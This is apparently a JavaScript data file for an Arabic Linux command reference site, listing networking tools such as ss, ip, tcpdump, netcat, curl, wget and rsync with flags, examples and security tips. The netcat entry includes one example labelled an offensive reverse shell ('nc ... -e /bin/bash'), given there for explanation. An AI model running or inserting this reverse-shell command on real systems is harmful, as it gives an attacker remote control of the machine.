// ==========================================
// 3. NETWORKING & CONNECTION MANAGEMENT (networking.js)
// ==========================================
window.LINUX_COMMANDS = (window.LINUX_COMMANDS || []).concat([
  {id:'ss',name:'ss',icon:'🔌',level:2,category:'Networking',
   desc:'عرض تفاصيل الاتصالات الشبكية والمقابس المفتوحة وتفوق على netstat الكلاسيكي',
   syntax:'ss [OPTIONS] [FILTER]',
   flags:[
     {flag:'-t',desc:'عرض اتصالات TCP فقط'},
     {flag:'-u',desc:'عرض اتصالات UDP فقط'},
     {flag:'-l',desc:'عرض المقابس التي تستمع للاتصالات حالياً (Listening)'},
     {flag:'-n',desc:'عدم تحويل الأرقام لأسماء (عرض أرقام المنافذ والـ IPs مباشرة)'},
     {flag:'-p',desc:'إظهار العمليات المالكة للاتصال (Process details)'},
     {flag:'-a',desc:'عرض جميع الاتصالات (المستمعة والنشطة)'}
   ],
   examples:[
     'ss -tlnp # فحص جميع منافذ TCP المفتوحة والنشطة مع اسم العمليات المالكة لها',
     'ss -uanp # فحص منافذ UDP النشطة والمستمعة'
   ],
   note:'تنبيه أمني: إذا وجدت منفذاً غريباً يستمع للاتصالات (Listen) بدون علمك، قم بفحص اسم العملية فوراً لمعرفة ما إذا كان الباب الخلفي (Backdoor) نشطاً.'
  },
  {id:'ip',name:'ip',icon:'🌐',level:2,category:'Networking',
   desc:'إدارة كروت الشبكة وعناوين الـ IP وجدول التوجيه بنظام لينكس (بديل ifconfig القديم)',
   syntax:'ip [OPTIONS] OBJECT COMMAND',
   flags:[
     {flag:'addr show',desc:'عرض عناوين الـ IP المرتبطة بكافة كروت الشبكة الحالية'},
     {flag:'link show',desc:'عرض الحالة الفيزيائية لكروت الشبكة (Up/Down) والـ MAC Address'},
     {flag:'route show',desc:'عرض جدول التوجيه (Routing Table) والـ Gateways'},
     {flag:'link set DEV up/down',desc:'تفعيل أو إيقاف تشغيل كارت شبكة محدد (مثل eth0)'},
     {flag:'addr add IP/MASK dev DEV',desc:'تعيين عنوان IP جديد يدوياً لكارت الشبكة'}
   ],
   examples:[
     'ip a # عرض سريع لعناوين الـ IP الحالية',
     'sudo ip link set eth0 down # إيقاف كارت الشبكة eth0 لحماية السيرفر',
     'ip route show'
   ],
  },
  {id:'bridge',name:'bridge',icon:'🌉',level:4,category:'Networking',
   desc:'إدارة وإعداد أجهزة الجسر الشبكي (Network Bridge) لربط كروت الشبكة ببعضها (مهم في الحاويات والـ VMs)',
   syntax:'bridge [OPTIONS] OBJECT COMMAND',
   flags:[
     {flag:'link show',desc:'عرض كروت الشبكة المرتبطة بـ Bridges حالياً'},
     {flag:'fdb show',desc:'عرض جدول تحويل البيانات للماك ادرس (Forwarding Database)'}
   ],
   examples:['bridge link show','bridge fdb show dev br0'],
  },
  {id:'tc',name:'tc (Traffic Control)',icon:'🚦',level:4,category:'Networking',
   desc:'التحكم بجودة الخدمة وسرعة تدفق البيانات (QoS) وتأخير الحزم والـ Traffic Shaping بالنواة',
   syntax:'tc [OPTIONS] qdisc|class|filter COMMAND dev DEV',
   flags:[
     {flag:'show dev DEV',desc:'عرض قواعد وإحصائيات كارت الشبكة المحدد'},
     {flag:'add dev DEV root ...',desc:'إضافة قاعدة للتحكم بالسرعة (شريط المرور)'}
   ],
   examples:[
     'tc qdisc show dev eth0',
     'sudo tc qdisc add dev eth0 root netem delay 100ms # محاكاة تأخير حزم الشبكة بمقدار 100ms للاختبار'
   ],
  },
  {id:'arp',name:'arp',icon:'🔍',level:2,category:'Networking',
   desc:'عرض وإدارة جدول مطابقة الـ IP مع الـ MAC Address (Address Resolution Protocol)',
   syntax:'arp [OPTIONS]',
   flags:[
     {flag:'-a',desc:'عرض الجدول بصيغة كاملة لكافة الواجهات'},
     {flag:'-d IP',desc:'حذف قيمة محددة من جدول الـ ARP لحل مشاكل الاتصال'},
     {flag:'-n',desc:'عرض الأرقام مباشرة دون فك ترميز أسماء الأجهزة'}
   ],
   examples:['arp -an','sudo arp -d 192.168.1.1'],
   note:'تنبيه أمني: فحص جدول الـ ARP يفيدك في اكتشاف هجمات الاختطاف (ARP Spoofing/MITM) بالشبكة المحلية.'
  },
  {id:'arping',name:'arping',icon:'📡',level:2,category:'Networking',
   desc:'إرسال طلبات ARP للأجهزة المجاورة بالشبكة للتحقق من اتصالها وعنوانها الفيزيائي الحقيقي',
   syntax:'arping [OPTIONS] -I dev DST_IP',
   flags:[
     {flag:'-c N',desc:'إرسال N حزم فقط والتوقف'},
     {flag:'-I DEV',desc:'تحديد كارت الشبكة المطلوب استخدامه للإرسال (إجباري)'}
   ],
   examples:['sudo arping -I eth0 192.168.1.1'],
  },
  {id:'tracepath',name:'tracepath',icon:'🗺️',level:2,category:'Networking',
   desc:'تتبع مسار حزم الشبكة حتى الوجهة وعرض قيم الـ MTU دون الحاجة لصلاحيات root',
   syntax:'tracepath [OPTIONS] HOST',
   flags:[
     {flag:'-n',desc:'إظهار الـ IPs رقمياً فقط لتسريع التتبع'},
     {flag:'-p PORT',desc:'تحديد منفذ مخصص لاستخدامه في الفحص والتتبع'}
   ],
   examples:['tracepath -n google.com','tracepath -p 80 8.8.8.8'],
  },
  {id:'mtr',name:'mtr (My Traceroute)',icon:'📊',level:3,category:'Networking',
   desc:'تتبع مسار تفاعلي يدمج بين عمل الـ ping والتتبع التاريخي مع عرض معدل فقدان الحزم المستمر',
   syntax:'mtr [OPTIONS] HOST',
   flags:[
     {flag:'-n',desc:'عرض الأرقام والـ IPs مباشرة'},
     {flag:'-r',desc:'وضع التقرير (Report mode) - يقوم بالفحص N مرات ويطبع تقريراً صامتاً ثم يخرج'},
     {flag:'-c N',desc:'عدد المحاولات والحزم المرسلة (الافتراضي 10)'}
   ],
   examples:['mtr google.com','mtr -n -r -c 50 1.1.1.1'],
  },
  {id:'ethtool',name:'ethtool',icon:'🔌',level:3,category:'System Administration',
   desc:'عرض وضبط خصائص كروت الشبكة الفيزيائية وسرعة النقل وتفاصيل الاتصال بالـ Switch',
   syntax:'ethtool [OPTIONS] DEV',
   flags:[
     {flag:'-i',desc:'عرض معلومات درايفر الكارت والنسخة البرمجية المدمجة'},
     {flag:'-S',desc:'عرض إحصائيات الأخطاء والـ Packets الفاشلة للكارت فيزيائياً'}
   ],
   examples:['sudo ethtool eth0','sudo ethtool -i eth0'],
  },
  {id:'iwconfig',name:'iwconfig',icon:'📡',level:2,category:'Networking',
   desc:'عرض وإعداد الواجهات والشبكات اللاسلكية Wi-Fi (قديم، تم استبداله بـ iw)',
   syntax:'iwconfig [DEV] [OPTIONS]',
   flags:[
     {flag:'mode MODE',desc:'تغيير وضع عمل الكارت (مثل Managed أو Monitor Mode للحقن والالتقاط)'},
     {flag:'channel N',desc:'تحديد قناة الـ Wi-Fi الفعالة للكارت'}
   ],
   examples:['iwconfig','sudo iwconfig wlan0 mode monitor'],
  },
  {id:'nft',name:'nft',icon:'🔥',level:4,category:'Firewall',
   desc:'إدارة قواعد جدار الحماية وجداول تصفية الحزم الحديثة بالنواة (البديل الرسمي لـ iptables)',
   syntax:'nft [OPTIONS] COMMAND',
   flags:[
     {flag:'list ruleset',desc:'عرض جميع الجداول والقواعد الجدارية الحالية بالكامل'},
     {flag:'flush ruleset',desc:'مسح وتصفير كل القواعد وجداول الفلترة الحالية'}
   ],
   examples:['sudo nft list ruleset','sudo nft flush ruleset'],
  },
  {id:'resolvectl',name:'resolvectl',icon:'🔎',level:2,category:'Networking',
   desc:'التفاعل مع نظام systemd-resolved لفحص وتوجيه طلبات ومخدمات الـ DNS المعتمدة للنظام',
   syntax:'resolvectl [OPTIONS] COMMAND [ARGS]',
   flags:[
     {flag:'status',desc:'عرض حالة وتفاصيل مخدمات الـ DNS لكل كارت شبكة حالي'},
     {flag:'query DOMAIN',desc:'إرسال استعلام مخصص وفك ترميز اسم النطاق'}
   ],
   examples:['resolvectl status','resolvectl query google.com'],
  },
  {id:'whois',name:'whois',icon:'🔍',level:2,category:'Reconnaissance',
   desc:'الاستعلام عن معلومات ملكية وتسجيل أسماء النطاقات وعناوين الـ IP من قواعد بيانات WHOIS العالمية',
   syntax:'whois [OPTIONS] TARGET',
   flags:[],
   examples:['whois example.com','whois 8.8.8.8'],
  },
  {id:'sftp',name:'sftp',icon:'📦',level:2,category:'Remote Access',
   desc:'نقل الملفات البعيد الآمن باستخدام بروتوكول SSH (Secure File Transfer Protocol)',
   syntax:'sftp [OPTIONS] USER@HOST',
   flags:[
     {flag:'-P PORT',desc:'تحديد منفذ اتصال مخصص'},
     {flag:'-i KEY',desc:'تحديد ملف المفتاح الخاص للاتصال'}
   ],
   examples:['sftp admin@192.168.1.10','sftp -P 2222 user@server.com'],
  },
  {id:'route',name:'route',icon:'🗺️',level:2,category:'Networking',
   desc:'عرض وإدارة جدول توجيه حزم البيانات (IP Routing Table) الكلاسيكي بالنظام',
   syntax:'route [OPTIONS]',
   flags:[
     {flag:'-n',desc:'عرض عناوين الـ IP رقمياً مباشرة وتجنب فك الأسماء لتسريع المخرجات'},
     {flag:'add default gw IP',desc:'إضافة بوابة افتراضية (Default Gateway) جديدة للنظام'},
     {flag:'del default gw IP',desc:'حذف البوابة الافتراضية المحددة'}
   ],
   examples:['route -n','sudo route add default gw 192.168.1.1'],
  },
  {id:'ping',name:'ping',icon:'📡',level:1,category:'Networking',
   desc:'التحقق من اتصال وجودة وكفاءة وصول الخادم البعيد عبر إرسال حزم ICMP Echo Request',
   syntax:'ping [OPTIONS] HOST',
   flags:[
     {flag:'-c N',desc:'إرسال N حزم فقط ثم التوقف تلقائياً'},
     {flag:'-i N',desc:'تحديد الفاصل الزمني بالثواني بين إرسال الحزم (الافتراضي ثانية)'},
     {flag:'-s SIZE',desc:'تحديد حجم حزمة البيانات بالبايتات المرسلة'},
     {flag:'-t TTL',desc:'تحديد قيمة الـ Time To Live للحزمة الموجهة'}
   ],
   examples:['ping -c 4 google.com','ping -s 1200 8.8.8.8'],
  },
  {id:'ping6',name:'ping6',icon:'📡',level:2,category:'Networking',
   desc:'نسخة مخصصة من أداة ping للتحقق من الاتصال وجودة الوصول عبر بروتوكول IPv6 المطور',
   syntax:'ping6 [OPTIONS] HOST',
   flags:[
     {flag:'-I DEV',desc:'تحديد كارت الشبكة المطلوب استخدامه للإرسال (مهم لاتصال link-local)'}
  ],
   examples:['ping6 -c 4 ipv6.google.com','ping6 -I eth0 fe80::1'],
  },
  {id:'nmcli',name:'nmcli',icon:'⚙️',level:3,category:'Networking',
   desc:'واجهة سطر الأوامر للتحكم بنظام NetworkManager لضبط كروت الشبكة والـ Wi-Fi والاتصالات بالكامل',
   syntax:'nmcli [OPTIONS] OBJECT { COMMAND | help }',
   flags:[
     {flag:'device status',desc:'عرض حالة وتفاصيل كل كروت الشبكة الحالية'},
     {flag:'connection show',desc:'سرد جميع ملفات الاتصال المخزنة والنشطة بالنظام'},
     {flag:'connection up ID',desc:'تفعيل وتشغيل ملف اتصال محدد بالاسم أو الـ UUID'},
     {flag:'connection down ID',desc:'إيقاف وتعطيل ملف اتصال نشط'},
     {flag:'device wifi list',desc:'عرض شبكات الـ Wi-Fi المتاحة والمحيطة بالجهاز حالياً'}
   ],
   examples:['nmcli device status','nmcli connection show','sudo nmcli connection up "Home-WiFi"'],
  },
  {id:'iw',name:'iw',icon:'📡',level:3,category:'Networking',
   desc:'الأداة الحديثة المعتمدة لإعداد وفحص الأجهزة والواجهات اللاسلكية Wi-Fi (بديل iwconfig)',
   syntax:'iw [OPTIONS] OBJECT COMMAND',
   flags:[
     {flag:'dev',desc:'سرد وعرض كافة واجهات الـ Wi-Fi الحالية ومعرفاتها'},
     {flag:'dev DEV scan',desc:'إجراء مسح شامل (Scan) للبحث عن الشبكات القريبة وتفاصيلها'},
     {flag:'dev DEV info',desc:'عرض تفاصيل تكوين الواجهة الحالية ووضع عملها'}
   ],
   examples:['iw dev','sudo iw wlan0 scan | grep SSID'],
  },
  {id:'tcpdump',name:'tcpdump',icon:'🕵️',level:4,category:'Networking',
   desc:'محلل وملتقط حزم البيانات التفاعلي الشامل للشبكات (Packet Sniffer & Analyzer)',
   syntax:'tcpdump [OPTIONS] [EXPRESSION]',
   flags:[
     {flag:'-i DEV',desc:'تحديد كارت الشبكة المطلوب التقاط الحزم منه (مثال: -i eth0)'},
     {flag:'-n',desc:'عدم ترجمة الـ IPs والأسماء وعرض الأرقام مباشرة لتفادي التأخير'},
     {flag:'-c N',desc:'التقاط N حزم فقط والتوقف'},
     {flag:'-w FILE.pcap',desc:'حفظ حزم البيانات الملتقطة في ملف pcap لتحليلها لاحقاً ببرنامج Wireshark'},
     {flag:'-r FILE.pcap',desc:'قراءة وتحليل حزم ملف pcap مسجل مسبقاً'},
     {flag:'-XX',desc:'طباعة محتويات وتفاصيل الحزمة بالكامل بصيغة الهكس والنصوص (Hex+ASCII)'},
     {flag:'port N',desc:'فلترة الفحص لالتقاط الحزم الخاصة بالمنفذ N فقط (مثل port 80)'}
   ],
   examples:[
     'sudo tcpdump -i eth0 -n -c 10',
     'sudo tcpdump -i wlan0 -w traffic.pcap tcp port 443',
     'sudo tcpdump -r traffic.pcap'
   ],
   note:'تحليل الشبكات: tcpdump هو الأداة رقم واحد لحل مشاكل الشبكات وفحص تدفقات البيانات المشبوهة أو الهجمات الجارية.'
  },
  {id:'netcat',name:'netcat (nc)',icon:'🔌',level:3,category:'Networking',
   desc:'سكين الجيش السويسري للشبكات - أداة قراءة وكتابة البيانات عبر اتصالات TCP/UDP',
   syntax:'nc [OPTIONS] HOST PORT',
   flags:[
     {flag:'-l',desc:'وضع الاستماع (Listen) لفتح منفذ واستقبال الاتصالات الواردة'},
     {flag:'-p PORT',desc:'تحديد المنفذ المطلوب استخدامه (مع -l للاستماع أو بدون للاستعلام)'},
     {flag:'-v',desc:'وضع تفصيلي (Verbose) لعرض تفاصيل محاولات الاتصال والنجاح'},
     {flag:'-z',desc:'وضع مسح المنافذ (Zero-I/O) - للتحقق من فتح المنفذ دون إرسال بيانات'},
     {flag:'-u',desc:'استخدام بروتوكول UDP بدلاً من TCP الافتراضي'},
     {flag:'-e CMD',desc:'تنفيذ أمر مخصص وتوجيه مدخلاته ومخرجاته للمقبس (خطر جداً: Reverse Shell)'}
   ],
   examples:[
     'nc -zv 192.168.1.10 20-80 # مسح سريع للمنافذ المفتوحة من 20 إلى 80',
     'nc -l -p 4444 # فتح مستمع عادي على منفذ 4444',
     'nc 10.10.10.10 4444 -e /bin/bash # اتصال عكسي هجومي كلاسيكي'
   ],
   note:'⚠️ تنبيه أمني: بعض توزيعات لينكس الحديثة تحذف خيار -e لأسباب أمنية لمنع استخدامه السهل في الاختراق.'
  },
  {id:'dig',name:'dig',icon:'🔍',level:2,category:'Networking',
   desc:'الاستعلام التفاعلي المتقدم عن سجلات الـ DNS (Domain Information Groper)',
   syntax:'dig [OPTIONS] @server DOMAIN [TYPE]',
   flags:[
     {flag:'+short',desc:'عرض النتيجة الصافية (مثل الـ IP فقط) لتسهيل معالجتها برمجياً'},
     {flag:'ANY',desc:'طلب استرجاع جميع السجلات المتاحة للنطاق بالوقت نفسه'},
     {flag:'TXT / MX / A',desc:'تحديد نوع السجل المطلوب (بريد، نصوص، عنوان)'}
   ],
   examples:[
     'dig google.com',
     'dig @8.8.8.8 example.com MX # الاستعلام من سيرفر DNS محدد لجوجل',
     'dig example.com TXT +short'
   ],
  },
  {id:'host',name:'host',icon:'🔍',level:1,category:'Networking',
   desc:'أداة بسيطة وسريعة لإجراء استعلامات الـ DNS ومطابقة النطاقات مع الـ IPs والعكس',
   syntax:'host [OPTIONS] TARGET',
   flags:[
     {flag:'-t TYPE',desc:'تحديد نوع سجل الـ DNS المطلوب (مثل A, MX, NS)'}
   ],
   examples:['host google.com','host 8.8.8.8 # عكس المطابقة (Reverse lookup)'],
  },
  {id:'nslookup',name:'nslookup',icon:'🔍',level:1,category:'Networking',
   desc:'الأداة الكلاسيكية الشهيرة لفحص واستعلام خوادم وسجلات الـ DNS (تفاعلية وغير تفاعلية)',
   syntax:'nslookup DOMAIN [DNS_SERVER]',
   flags:[],
   examples:['nslookup yahoo.com','nslookup google.com 1.1.1.1'],
  },
  {id:'curl',name:'curl',icon:'🌐',level:1,category:'Networking',
   desc:'أداة قوية لنقل البيانات من وإلى الخوادم البعيدة وتدعم بروتوكولات عديدة (HTTP, HTTPS, FTP...)',
   syntax:'curl [OPTIONS] URL',
   flags:[
     {flag:'-o FILE',desc:'حفظ ناتج الطلب في ملف محدد بدلاً من طباعته على الشاشة'},
     {flag:'-O',desc:'حفظ الملف بنفس اسمه البعيد على السيرفر'},
     {flag:'-I',desc:'طلب ترويسات الـ HTTP فقط (Headers) دون تحميل محتوى الصفحة'},
     {flag:'-H "HEADER"',desc:'إرسال ترويسة مخصصة مع الطلب (مثالي لاختبار الـ APIs)'},
     {flag:'-X METHOD',desc:'تحديد طريقة الطلب (مثل GET, POST, PUT, DELETE)'},
     {flag:'-d "DATA"',desc:'إرسال بيانات مخصصة في جسم الطلب (POST data)'},
     {flag:'-L',desc:'تتبع التحويلات التلقائية للصفحة (Redirections)'},
     {flag:'-k / --insecure',desc:'تجاهل التحقق من شهادة الـ SSL/TLS غير الموثوقة'}
   ],
   examples:[
     'curl -I https://google.com',
     'curl -o test.html https://example.com/page.html',
     'curl -X POST -d "param1=value1" https://api.internal/v1/auth'
   ],
  },
  {id:'wget',name:'wget',icon:'📥',level:1,category:'Networking',
   desc:'أداة تنزيل وتحميل الملفات من الويب وتدعم الاستئناف والتنزيل التكراري للمواقع بالكامل',
   syntax:'wget [OPTIONS] URL',
   flags:[
     {flag:'-O FILE',desc:'تحديد اسم الملف المحفوظ محلياً'},
     {flag:'-c',desc:'استئناف تحميل ملف تم إيقافه مسبقاً (Continue)'},
     {flag:'-r',desc:'تنزيل تكراري للموقع بالكامل (Recursive) - مفيد لسحب الصفحات'},
     {flag:'--limit-rate=RATE',desc:'تحديد أقصى سرعة تحميل مسموح بها (مثل 500k)'},
     {flag:'--no-check-certificate',desc:'تجاهل التحقق من شهادات الحماية الرقمية'}
   ],
   examples:[
     'wget https://example.com/file.zip',
     'wget -c https://example.com/huge_iso.iso',
     'wget --limit-rate=100k https://example.com/file.pdf'
   ],
  },
  {id:'scp',name:'scp',icon:'🚚',level:2,category:'Remote Access',
   desc:'نسخ ونقل الملفات بأمان بين الأجهزة البعيدة عبر الشبكة باستخدام بروتوكول SSH (Secure Copy)',
   syntax:'scp [OPTIONS] SOURCE DEST',
   flags:[
     {flag:'-P PORT',desc:'تحديد منفذ SSH مخصص (وليس -p)'},
     {flag:'-r',desc:'نسخ المجلدات بالكامل تكرارياً (Recursive)'},
     {flag:'-i KEY',desc:'تحديد ملف المفتاح الخاص (Identity file) للمصادقة'},
     {flag:'-p',desc:'الحفاظ على أوقات التعديل والصلاحيات الأصلية للملف'}
   ],
   examples:[
     'scp local.txt user@192.168.1.50:/home/user/',
     'scp -r user@server.com:/var/www/html/ ./local_backup/',
     'scp -P 2222 -i id_rsa secure.zip root@10.0.0.1:/root/'
   ],
  },
  {id:'rsync',name:'rsync',icon:'🔄',level:3,category:'System Administration',
   desc:'أداة مزامنة ونقل الملفات الذكية والسريعة للغاية محلياً وبعيداً (تعتمد على الفروقات فقط)',
   syntax:'rsync [OPTIONS] SOURCE DEST',
   flags:[
     {flag:'-a',desc:'وضع الأرشفة (يحافظ على الصلاحيات، المالك، الروابط الرمزية، والتوقيت)'},
     {flag:'-v',desc:'عرض تفاصيل الملفات الجاري نقلها ومزامنتها (Verbose)'},
     {flag:'-z',desc:'ضغط البيانات أثناء النقل لتسريع المزامنة عبر الشبكة'},
     {flag:'--delete',desc:'حذف الملفات من الوجهة إذا لم تكن موجودة في المصدر لضمان المطابقة التامة'},
     {flag:'--exclude=PATTERN',desc:'استثناء ملفات أو مجلدات معينة من المزامنة (مثل *.tmp)'},
     {flag:'--progress',desc:'عرض شريط التقدم الفعلي للعملية بالتفصيل'}
   ],
   examples:[
     'rsync -avz /var/www/html/ /backup/www/',
     'rsync -avz --delete -e "ssh -p 2222" local/ user@remote:/remote/dir/'
   ],
  }
]);
